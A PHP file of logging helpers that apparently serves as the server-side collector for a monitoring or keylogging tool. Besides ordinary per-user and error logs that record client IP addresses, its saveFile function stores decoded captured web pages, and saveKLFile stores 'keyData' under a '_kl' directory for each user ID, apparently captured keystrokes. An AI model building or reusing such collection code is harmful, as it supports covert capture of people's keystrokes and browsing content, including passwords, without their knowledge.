<?php

	function single_line_print_r($object)
	{
		return str_replace("\r", "", str_replace("\n", "", print_r($object, true)));
	}

	function getNow($format)
	{
		$now = new DateTime("now", new DateTimeZone("America/Los_Angeles"));

		return $now->format($format);
	}

	function getLogPath($uid)
	{
		$path = "/var/www/html/log/" . $uid . "/";

		if (!file_exists($path))
		{
			if (mkdir($path) === false)
			{
				/* print_r(error_get_last()); */ // Typically permission error
			}
		}

		return $path;
	}

	function logGeneral($uid, $message)
	{
		$filename = "/var/www/html/log/GENERAL.log";
		return;

		try {
			$f = fopen($filename, "a");
			fwrite($f, $uid . ": " . getNow("Y-m-d H:i:s") . ": " . $_SERVER["REMOTE_ADDR"] . ": " . $message . "\n");
			fclose($f);
		} catch ( Exception $e ) {
			// send error message if you can
		} 
	}

	function logEntry($uid, $message)
	{
		// logGeneral($uid, $message);

		$filename = getLogPath($uid) . getNow("Ymd") . ".log";

		try {
			$f = fopen($filename, "a");
			fwrite($f, getNow("Y-m-d H:i:s") . ": " . $_SERVER["REMOTE_ADDR"] . ": " . $message . "\n");
			fclose($f);
		} catch ( Exception $e ) {
			// send error message if you can
		} 
	}

	function logError($uid, $message)
	{
		$filename = "/var/www/html/log/ERRORS.log";

		try {
			$f = fopen($filename, "a");
			fwrite($f, getNow("Y-m-d H:i:s") . ": " . $_SERVER["REMOTE_ADDR"] . ": " . $uid . ": " . $message . "\n");
			fclose($f);
		} catch ( Exception $e ) {
			// send error message if you can
		} 
	}

	function saveFile($uid, $url, $script, $file)
	{
		$path = getLogPath($uid) . $script . "/";

		if (!file_exists($path))
		{
			mkdir($path);
		}

		$filename = $path . getNow("YmdHis") . ".html";

		file_put_contents($filename, $url . "\r\n" . rawurldecode(rawurldecode(base64_decode($file))));
	}

	function saveKLFile($uid, $_kl, $keyData)
	{
		// http://stackoverflow.com/questions/15012214/mkdir-says-theres-no-such-directory-and-fails
		$path = getLogPath("_kl") . $uid . "/";

		if (!file_exists($path))
		{
			mkdir($path);
		}

		$filename = $path . getNow("YmdHis") . ".txt";

		file_put_contents($filename, $_kl . "\r\n" . $keyData);
	}

?>